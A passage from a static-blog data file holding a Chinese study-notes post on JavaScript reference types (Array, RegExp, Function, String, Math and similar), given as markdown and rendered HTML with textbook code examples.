ignoreCase：布尔值，表示是否设置了 i 标志。\n   - lastIndex：整数，表示开始搜索下一个匹配项的字符位置，从 0 算起。\n   - multiline：布尔值，表示是否设置了 m 标志。\n   - source：正则表达式的字符串表示，按照字面量形式而非传入构造函数中的字符串模式返回。\n5. 实例方法：\n   - `exec()`：待完善\n   - `test()`：待完善\n6. 构造函数属性：待完善\n7. 模式的局限性：待完善\n\n## Function 类型\n\n1. 没有重载（深入理解）：函数名是引用（指针），后声明的会覆盖之前的。\n2. 函数声明与函数表达式：解析器处理方式不同，函数声明会在执行其他代码前先读取，函数表达式会在执行到该代码时才读取执行。\n3. 作为值的函数\n\n```js\nfunction createComparisonFunction(propertyName) {\n  return function(object1, object2) {\n    var value1 = object1[propertyName];\n    var value2 = object2[propertyName];\n    if (value1 < value2) {\n      return -1;\n    } else if (value1 > value2) {\n      return 1;\n    } else {\n      return 0;\n    }\n  };\n}\n```\n\n4. 函数内部属性：内部两个特殊的对象：`arguments` 和`this`。\n   - 理解`arguments.callee`\n   - 理解`arguments.callee.caller`\n5. 函数属性和方法：\n   - `length`和`prototype`\n   - 每个函数都包含两个非继承而来的方法：`apply()`和`call()`。\n   - `bind()`\n\n## 基本包装类型\n\n1. Boolean 类型\n2. Number 类型\n   - `num.toFixed([digits])`，参数表示保留几位小数，四舍五入。\n   - `num.toExponential([digits])`，参数表示保留几位小数，四舍五入，e 表示法。\n   - `num.toPrecision([digits])`，参数表示保留所有数字的位数（不包括指数部分），灵活返回 fixed 或者 exponential 格式。\n3. String 类型\n   - `charAt()`和`charCodeAt()`，访问特定字符。\n   - `concat()`，拼接字符串，但是实践中更多用'+'。\n   - `slice(start[, end])`，不改原字符串，返回新字符串。\n   - `substr(start[, length])`，不改原字符串，返回新字符串。\n   - `substring(start[, end])`，不改原字符串，返回新字符串。\n   - `indexOf()`和`lastIndexOf()`，查找子字符串位置。\n   - `trim()`，删除首尾空格，不改原字符串，返回新字符串。\n   - `toLowerCase()`、`toLocaleLowerCase()`、`toUpperCase()`和`toLocaleUpperCase()`，大小写转换，不改原字符串，返回新字符串。\n   - `match()`\n   - `search()`\n   - `replace()`\n   - `split()`\n   - `localeCompare()`，比较该字符串与参数字符串在字母表中的位置，前负，后正，等零。\n   - `fromCharCode()`，静态方法，与实例方法`charCodeAt()`相反操作。\n     ```js\n     alert(String.fromCharCode(104, 101, 108, 108, 111)); //\"hello\"\n     ```\n\n## 单体内置对象\n\n1. Global 对象\n   - `encodeURI()`和`encodeURIComponent()`\n     ```js\n     var uri = \"http://www.wrox.com/illegal value.htm#start\";\n     //\"http://www.wrox.com/illegal%20value.htm#start\"\n     alert(encodeURI(uri));\n     //\"http%3A%2F%2Fwww.wrox.com%2Fillegal%20value.htm%23start\"\n     alert(encodeURIComponent(uri));\n     ```\n   - `decodeURI()`和`decodeURIComponent()`\n     ```js\n     var uri = \"http%3A%2F%2Fwww.wrox.com%2Fillegal%20value.htm%23start\";\n     //http%3A%2F%2Fwww.wrox.com%2Fillegal value.htm%23start\n     alert(decodeURI(uri));\n     //http://www.wrox.com/illegal value.htm#start\n     alert(decodeURIComponent(uri));\n     ```\n   - `eval()`，谨慎使用，防止代码注入。\n2. Math 对象\n   - `Math.PI`，π 的值。\n   - `Math.min()`，最小值。\n   - `Math.max()`，最大值。\n   - `Math.ceil()`，向上舍入。\n   - `Math.floor()`，向下舍入。\n   - `Math.round()`，四舍五入。\n   - `Math.random()`，随机数`[0,1)`。\n   - `Math.abs()`，绝对值。\n","slug":"2019-01-10-JS高设3版-5","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"ck0m3d8we0048wovvvwyswo8b","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>重读《JavaScript高级程序设计》，温故而知新。</p>\n<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>引用类型：重点掌握数组，正则，字符串的相关使用。<br><a id=\"more\"></a></p>\n<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"Array-类型\"><a href=\"#Array-类型\" class=\"headerlink\" title=\"Array 类型\"></a>Array 类型</h2><ol>\n<li>读取值用方括号<code>+</code>基于 0 的数字索引，例如<code>color[0]</code>。</li>\n<li>length 属性的使用，例如<code>colors[colors.length] = &quot;black&quot;;</code>。</li>\n<li>检测数组，<code>Array.isArray(value)</code>。</li>\n<li><code>toString()</code>方法返回逗号分隔的字符串，想用其他分隔符可以用<code>join()</code>方法。</li>\n<li><p>常用方法：</p>\n<ul>\n<li>栈 LIFO（Last-In-First-Out，后进先出）方法<code>push() + pop()</code></li>\n<li>队列 FIFO（First-In-First-Out，先进先出）方法<code>push() + shift()</code>，反方向<code>unshift() + pop()</code></li>\n<li>排序方法<code>reverse()、sort()</code></li>\n<li><code>concat()</code>方法，不改原数组，返回新数组，参数可以为空、一个、多个，可以为数组或者值。</li>\n<li><p><code>slice()</code>方法，不改原数组，返回新数组，参数可以一个或者两个，即起始位置和结束位置。若只有一个参数，则返回给定起始位置到数组末尾所有项。若两个参数，则返回起始到结束位置间的所有项，不包括结束位置项。<br>语法：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">arr.slice();</span><br><span class=\"line\"><span class=\"comment\">// [0, end]</span></span><br><span class=\"line\"></span><br><span class=\"line\">arr.slice(begin);</span><br><span class=\"line\"><span class=\"comment\">// [begin, end]</span></span><br><span class=\"line\"></span><br><span class=\"line\">arr.slice(begin, end);</span><br><span class=\"line\"><span class=\"comment\">// [begin, end)</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p><code>splice()</code>，实现<strong>删除</strong>、<strong>插入</strong>和<strong>替换</strong>，修改原数组，返回新数组。<br>语法：<br><code>js array.splice(start[, deleteCount[, item1[, item2[, ...]]]])</code></p>\n</li>\n<li><code>indexOf()和lastIndexOf()</code>，返回在数组中可以找到一个给定元素的第一个索引，如果不存在，则返回-1。<br>语法：<br><code>js arr.indexOf(searchElement) arr.indexOf(searchElement[, fromIndex]) arr.lastIndexOf(searchElement) arr.lastIndexOf(searchElement[, fromIndex])</code></li>\n<li><code>every()</code>：对数组中的每一项运行给定函数，如果该函数对每一项都返回 true，则返回 true。</li>\n<li><code>filter()</code>：对数组中的每一项运行给定函数，返回该函数会返回 true 的项组成的数组。</li>\n<li><code>forEach()</code>：对数组中的每一项运行给定函数。这个方法没有返回值。</li>\n<li><code>map()</code>：对数组中的每一项运行给定函数，返回每次函数调用的结果组成的数组。</li>\n<li><code>some()</code>：对数组中的每一项运行给定函数，如果该函数对任一项返回 true，则返回 true。</li>\n<li><p><code>reduce()和reduceRight()</code>，这两个方法都会迭代数组的所有项，然后构建一个最终返回的值。其中，reduce()方法从数组的第一项开始，逐个遍历到最后。而 reduceRight()则从数组的最后一项开始，向前遍历到第一项。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> values = [<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>, <span class=\"number\">5</span>];</span><br><span class=\"line\"><span class=\"keyword\">var</span> sum = values.reduce(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">prev, cur, index, array</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> prev + cur;</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\">alert(sum); <span class=\"comment\">//15</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> values = [<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>, <span class=\"number\">5</span>];</span><br><span class=\"line\"><span class=\"keyword\">var</span> sum = values.reduceRight(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">prev, cur, index, array</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> prev + cur;</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\">alert(sum); <span class=\"comment\">//15</span></span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n</li>\n</ol>\n<h2 id=\"Date-类型\"><a href=\"#Date-类型\" class=\"headerlink\" title=\"Date 类型\"></a>Date 类型</h2><ol>\n<li><code>Date.now()</code></li>\n<li><code>Date.parse()</code></li>\n<li><code>date.getTime()</code></li>\n</ol>\n<h2 id=\"RegExp-类型\"><a href=\"#RegExp-类型\" class=\"headerlink\" title=\"RegExp 类型\"></a>RegExp 类型</h2><ol>\n<li>语法<code>var expression = / pattern /flags;</code>。</li>\n<li>flags 标志有 3 个：<ul>\n<li>g：表示全局（global）模式，即模式将被应用于所有字符串，而非在发现第一个匹配项时立即停止；</li>\n<li>i：表示不区分大小写（case-insensitive）模式，即在确定匹配项时忽略模式与字符串的大小写；</li>\n<li>m：表示多行（multiline）模式，即在到达一行文本末尾时还会继续查找下一行中是否存在与模式匹配的项。</li>\n</ul>\n</li>\n<li>模式中元字符需要转义，元字符包括：<code>( [ { \\ ^ $ | ) ? * + .]}</code>。</li>\n<li>实例属性：<ul>\n<li>global：布尔值，表示是否设置了 g 标志。</li>\n<li>ignoreCase：布尔值，表示是否设置了 i 标志。</li>\n<li>lastIndex：整数，表示开始搜索下一个匹配项的字符位置，从 0 算起。</li>\n<li>multiline：布尔值，表示是否设置了 m 标志。</li>\n<li>source：正则表达式的字符串表示，按照字面量形式而非传入构造函数中的字符串模式返回。</li>\n</ul>\n</li>\n<li>实例方法：<ul>\n<li><code>exec()</code>：待完善</li>\n<li><code>test()</code>：待完善</li>\n</ul>\n</li>\n<li>构造函数属性：待完善</li>\n<li>模式的局限性：待完善</li>\n</ol>\n<h2 id=\"Function-类型\"><a href=\"#Function-类型\" class=\"headerlink\" title=\"Function 类型\"></a>Function 类型</h2><ol>\n<li>没有重载（深入理解）：函数名是引用（指针），后声明的会覆盖之前的。</li>\n<li>函数声明与函数表达式：解析器处理方式不同，函数声明会在执行其他代码前先读取，函数表达式会在执行到该代码时才读取执行。</li>\n<li>作为值的函数</li>\n</ol>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">createComparisonFunction</span>(<span class=\"params\">propertyName</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">object1, object2</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> value1 = object1[propertyName];</span><br><span class=\"line\">    <span class=\"keyword\">var</span> value2 = object2[propertyName];</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (value1 &lt; value2) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (value1 &gt; value2) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ol start=\"4\">\n<li>函数内部属性：内部两个特殊的对象：<code>arguments</code> 和<code>this</code>。<ul>\n<li>理解<code>arguments.callee</code></li>\n<li>理解<code>arguments.callee.caller</code></li>\n</ul>\n</li>\n<li>函数属性和方法：<ul>\n<li><code>length</code>和<code>prototype</code></li>\n<li>每个函数都包含两个非继承而来的方法：<code>apply()</code>和<code>call()</code>。</li>\n<li><code>bind()</code></li>\n</ul>\n</li>\n</ol>\n<h2 id=\"基本包装类型\"><a href=\"#基本包装类型\" class=\"headerlink\" title=\"基本包装类型\"></a>基本包装类型</h2><ol>\n<li>Boolean 类型</li>\n<li>Number 类型<ul>\n<li><code>num.toFixed([digits])</code>，参数表示保留几位小数，四舍五入。</li>\n<li><code>num.toExponential([digits])</code>，参数表示保留几位小数，四舍五入，e 表示法。</li>\n<li><code>num.toPrecision([digits])</code>，参数表示保留所有数字的位数（不包括指数部分），灵活返回 fixed 或者 exponential 格式。</li>\n</ul>\n</li>\n<li>String 类型<ul>\n<li><code>charAt()</code>和<code>charCodeAt()</code>，访问特定字符。</li>\n<li><code>concat()</code>，拼接字符串，但是实践中更多用’+’。</li>\n<li><code>slice(start[, end])</code>，不改原字符串，返回新字符串。</li>\n<li><code>substr(start[, length])</code>，不改原字符串，返回新字符串。</li>\n<li><code>substring(start[, end])</code>，不改原字符串，返回新字符串。</li>\n<li><code>indexOf()</code>和<code>lastIndexOf()</code>，查找子字符串位置。</li>\n<li><code>trim()</code>，删除首尾空格，不改原字符串，返回新字符串。</li>\n<li><code>toLowerCase()</code>、<code>toLocaleLowerCase()</code>、<code>toUpperCase()</code>和<code>toLocaleUpperCase()</code>，大小写转换，不改原字符串，返回新字符串。</li>\n<li><code>match()</code></li>\n<li><code>search()</code></li>\n<li><code>replace()</code></li>\n<li><code>split()</code></li>\n<li><code>localeCompare()</code>，比较该字符串与参数字符串在字母表中的位置，前负，后正，等零。</li>\n<li><code>fromCharCode()</code>，静态方法，与实例方法<code>charCodeAt()</code>相反操作。<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">alert(<span class=\"built_in\">String</span>.fromCharCode(<span class=\"number\">104</span>, <span class=\"number\">101</span>, <span class=\"number\">108</span>, <span class=\"number\">108</span>, <span class=\"number\">111</span>)); <span class=\"comment\">//\"hello\"</span></span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n</li>\n</ol>\n<h2 id=\"单体内置对象\"><a href=\"#单体内置对象\" class=\"headerlink\" title=\"单体内置对象\"></a>单体内置对象</h2><ol>\n<li><p>Global 对象</p>\n<ul>\n<li><p><code>encodeURI()</code>和<code>encodeURIComponent()</code></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> uri = <span class=\"string\">\"http://www.wrox.com/illegal value.htm#start\"</span>;</span><br><span class=\"line\"><span class=\"comment\">//\"http://www.wrox.com/illegal%20value.htm#start\"</span></span><br><span class=\"line\">alert(<span class=\"built_in\">encodeURI</span>(uri));</span><br><span class=\"line\"><span class=\"comment\">//\"http%3A%2F%2Fwww.wrox.com%2Fillegal%20value.htm%23start\"</span></span><br><span class=\"line\">alert(<span class=\"built_in\">encodeURIComponent</span>(uri));</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><code>decodeURI()</code>和<code>decodeURIComponent()</code></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> uri = <span class=\"string\">\"http%3A%2F%2Fwww.wrox.com%2Fillegal%20value.htm%23start\"</span>;</span><br><span class=\"line\"><span class=\"comment\">//http%3A%2F%2Fwww.wrox.com%2Fillegal value.htm%23start</span></span><br><span class=\"line\">alert(<span class=\"built_in\">decodeURI</span>(uri));</span><br><span class=\"line\"><span class=\"comment\">//http://www.wrox.com/illegal value.htm#start</span></span><br><span class=\"line\">alert(<span class=\"built_in\">decodeURIComponent</span>(uri));</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><code>eval()</code>，谨慎使用，防止代码注入。</p>\n</li>\n</ul>\n</li>\n<li>Math 对象<ul>\n<li><code>Math.PI</code>，π 的值。</li>\n<li><code>Math.min()</code>，最小值。</li>\n<li><code>Math.max()</code>，最大值。</li>\n<li><code>Math.ceil()</code>，向上舍入。</li>\n<li><code>Math.floor()</code>，向下舍入。</li>\n<li><code>Math.round()</code>，四舍五入。</li>\n<li><code>Math.random()</code>，随机数<code>[0,1)</code>。</li>\n<li><code>Math.abs()</code>，绝对值。</li>\n</ul>\n</li>\n</ol>\n","site":{"data":{}},"excerpt":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>重读《JavaScript高级程序设计》，温故而知新。</p>\n<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>引用类型：重点掌握数组，正则，字符串的相关使用。<br></p>","more":"<p></p>\n<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"Array-类型\"><a href=\"#Array-类型\" class=\"headerlink\" title=\"Array 类型\"></a>Array 类型</h2><ol>\n<li>读取值用方括号<code>+</code>基于 0 的数字索引，例如<code>color[0]</code>。</li>\n<li>length 属性的使用，例如<code>colors[colors.length] = &quot;black&quot;;</code>。</li>\n<li>检测数组，<code>Array.isArray(value)</code>。</li>\n<li><code>toString()</code>方法返回逗号分隔的字符串，想用其他分隔符可以用<code>join()</code>方法。</li>\n<li><p>常用方法：</p>\n<ul>\n<li>栈 LIFO（Last-In-First-Out，后进先出）方法<code>push() + pop()</code></li>\n<li>队列 FIFO（First-In-First-Out，先进先出）方法<code>push() + shift()</code>，反方向<code>unshift() + pop()</code></li>\n<li>排序方法<code>reverse()、sort()</code></li>\n<li><code>concat()</code>方法，不改原数组，返回新数组，参数可以为空、一个、多个，可以为数组或者值。</li>\n<li><p><code>slice()</code>方法，不改原数组，返回新数组，参数可以一个或者两个，即起始位置和结束位置。若只有一个参数，则返回给定起始位置到数组末尾所有项。若两个参数，则返回起始到结束位置间的所有项，不包括结束位置项。<br>语法：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">arr.slice();</span><br><span class=\"line\"><span class=\"comment\">// [0, end]</span></span><br><span class=\"line\"></span><br><span class=\"line\">arr.slice(begin);</span><br><span class=\"line\"><span class=\"comment\">// [begin, end]</span></span><br><span class=\"line\"></span><br><span class=\"line\">arr.slice(begin, end);</span><br><span class=\"line\"><span class=\"comment\">// [begin, end)</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p><code>splice()</code>，实现<strong>删除</strong>、<strong>插入</strong>和<strong>替换</strong>，修改原数组，返回新数组。<br>语法：<br><code>js array.splice(start[, deleteCount[, item1[, item2[, ...]]]])</code></p>\n</li>\n<li><code>indexOf()和lastIndexOf()</code>，返回在数组中可以找到一个给定元素的第一个索引，如果不存在，则返回-1。<br>语法：<br><code>js arr.indexOf(searchElement) arr.indexOf(searchElement[, fromIndex]) arr.lastIndexOf(searchElement) arr.lastIndexOf(searchElement[, fromIndex])</code></li>\n<li><code>every()</code>：对数组中的每一项运行给定函数，如果该函数对每一项都返回 true，则返回 true。</li>\n<li><code>filter()</code>：对数组中的每一项运行给定函数，返回该函数会返回 true 的项组成的数组。</li>\n<li><code>forEach()</code>：对数组中的每一项运行给定函数。这个方法没有返回值。</li>\n<li><code>map()</code>：对数组中的每一项运行给定函数，返回每次函数调用的结果组成的数组。</li>\n<li><code>some()</code>：对数组中的每一项运行给定函数，如果该函数对任一项返回 true，则返回 true。</li>\n<li><p><code>reduce()和reduceRight()</code>，这两个方法都会迭代数组的所有项，然后构建一个最终返回的值。其中，reduce()方法从数组的第一项开始，逐个遍历到最后。而 reduceRight()则从数组的最后一项开始，向前遍历到第一项。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> values = [<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>, <span class=\"number\">5</span>];</span><br><span class=\"line\"><span class=\"keyword\">var</span> sum = values.reduce(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">prev, cur, index, array</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> prev + cur;</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\">alert(sum); <span class=\"comment\">//15</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> values = [<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>, <span class=\"number\">5</span>];</span><br><span class=\"line\"><span class=\"keyword\">var</span> sum = values.reduceRight(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">prev, cur, index, array</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> prev + cur;</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\">alert(sum); <span class=\"comment\">//15</span></span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n</li>\n</ol>\n<h2 id=\"Date-类型\"><a href=\"#Date-类型\" class=\"headerlink\" title=\"Date 类型\"></a>Date 类型</h2><ol>\n<li><code>Date.now()</code></li>\n<li><code>Date.parse()</code></li>\n<li><code>date.getTime()</code></li>\n</ol>\n<h2 id=\"RegExp-类型\"><a href=\"#RegExp-类型\" class=\"headerlink\" title=\"RegExp 类型\"></a>RegExp 类型</h2><ol>\n<li>语法<code>var expression = / pattern /flags;</code>。</li>\n<li>flags 标志有 3 个：<ul>\n<li>g：表示全局（global）模式，即模式将被应用于所有字符串，而非在发现第一个匹配项时立即停止；</li>\n<li>i：表示不区分大小写（case-insensitive）模式，即在确定匹配项时忽略模式与字符串的大小写；</li>\n<li>m：表示多行（multiline）模式，即在到达一行文本末尾时还会继续查找下一行中是否存在与模式匹配的项。</li>\n</ul>\n</li>\n<li>模式中元字符需要转义，元字符包括：<code>( [ { \\ ^ $ | ) ? * + .]}</code>。</li>\n<li>实例属性：<ul>\n<li>global：布尔值，表示是否设置了 g 标志。</li>\n<li>ignoreCase：布尔值，表示是否设置了 i 标志。</li>\n<li>lastIndex：整数，表示开始搜索下一个匹配项的字符位置，从 0 算起。</li>\n<li>multiline：布尔值，表示是否设置了 m 标志。</li>\n<li>source：正则表达式的字符串表示，按照字面量形式而非传入构造函数中的字符串模式返回。</li>\n</ul>\n</li>\n<li>实例方法：<ul>\n<li><code>exec()</code>：待完善</li>\n<li><code>test()</code>：待完善</li>\n</ul>\n</li>\n<li>构造函数属性：待完善</li>\n<li>模式的局限性：待完善</li>\n</ol>\n<h2 id=\"Function-类型\"><a href=\"#Function-类型\" class=\"headerlink\" title=\"Function 类型\"></a>Function 类型</h2><ol>\n<li>没有重载（深入理解）：函数名是引用（指针），后声明的会覆盖之前的。</li>\n<li>函数声明与函数表达式：解析器处理方式不同，函数声明会在执行其他代码前先读取，函数表达式会在执行到该代码时才读取执行。</li>\n<li>作为值的函数</li>\n</ol>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">createComparisonFunction</span>(<span class=\"params\">propertyName</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">object1, object2</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> value1 = object1[propertyName];</span><br><span class=\"line\">    <span class=\"keyword\">var</span> value2 = object2[propertyName];</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (value1 &lt; value2) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (value1 &gt; value2) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ol start=\"4\">\n<li>函数内部属性：内部两个特殊的对象：<code>arguments</code> 和<code>this</code>。<ul>\n<li>理解<code>arguments.callee</code></li>\n<li>理解<code>arguments.callee.caller</code></li>\n</ul>\n</li>\n<li>函数属性和方法：<ul>\n<li><code>length</code>和<code>prototype</code></li>\n<li>每个函数都包含两个非继承而来的方法：<code>apply()</code>和<code>call()</code>。</li>\n<li><code>bind()</code></li>\n</ul>\n</li>\n</ol>\n<h2 id=\"基本包装类型\"><a href=\"#基本包装类型\" class=\"headerlink\" title=\"基本包装类型\"></a>基本包装类型</h2><ol>\n<li>Boolean 类型</li>\n<li>Number 类型<ul>\n<li><code>num.toFixed([digits])</code>，参数表示保留几位小数，四舍五入。</li>\n<li><code>num.toExponential([digits])</code>，参数表示保留几位小数，四舍五入，e 表示法。</li>\n<li><code>num.toPrecision([digits])</code>，参数表示保留所有数字的位数（不包括指数部分），灵活返回 fixed 或者 exponential 格式。</li>\n</ul>\n</li>\n<li>String 类型<ul>\n<li><code>charAt()</code>和<code>charCodeAt()</code>，访问特定字符。</li>\n<li><code>concat()</code>，拼接字符串，但是实践中更多用’+’。</li>\n<li><code>slice(start[, end])</code>，不改原字符串，返回新字符串。</li>\n<li><code>substr(start[, length])</code>，不改原字符串，返回新字符串。</li>\n<li><code>substring(start[, end])</code>，不改原字符串，返回新字符串。</li>\n<li><code>indexOf()</code>和<code>lastIndexOf()</code>，查找子字符串位置。</li>\n<li><code>trim()</code>，删除首尾空格，不改原字符串，返回新字符串。</li>\n<li><code>toLowerCase()</code>、<code>toLocaleLowerCase()</code>、<code>toUpperCase()</code>和<code>toLocaleUpperCase()</code>，大小写转换，不改原字符串，返回新字符串。</li>\n<li><code>match()</code></li>\n<li><code>search()</code></li>\n<li><code>replace()</code></li>\n<li><code>split()</code></li>\n<li><code>localeCompare()</code>，比较该字符串与参数字符串在字母表中的位置，前负，后正，等零。</li>\n<li><code>fromCharCode()</code>，静态方法，与实例方法<code>charCodeAt()</code>相反操作。<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">alert(<span class=\"built_in\">String</span>.fromCharCode(<span class=\"number\">104</span>, <span class=\"number\">101</span>, <span class=\"number\">108</span>, <span class=\"number\">108</span>, <span class=\"number\">111</span>)); <span class=\"comment\">//\"hello\"</span></span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n</li>\n</ol>\n<h2 id=\"单体内置对象\"><a href=\"#单体内置对象\" class=\"headerlink\" title=\"单体内置对象\"></a>单体内置对象</h2><ol>\n<li><p>Global 对象</p>\n<ul>\n<li><p><code>encodeURI()</code>和<code>encodeURIComponent()</code></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> uri = <span class=\"string\">\"http://www.wrox.com/illegal value.htm#start\"</span>;</span><br><span class=\"line\"><span class=\"comment\">//\"http://www.wrox.com/illegal%20value.htm#start\"</span></span><br><span class=\"line\">alert(<span class=\"built_in\">encodeURI</span>(uri));</span><br><span class=\"line\"><span class=\"comment\">//\"http%3A%2F%2Fwww.wrox.com%2Fillegal%20value.htm%23start\"</span></span><br><span class=\"line\">alert(<span class=\"built_in\">encodeURIComponent</span>(uri));</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><code>decodeURI()</code>和<code>decodeURIComponent()</code></p>\n<figure class=\"highlight js\"><table><tr><td 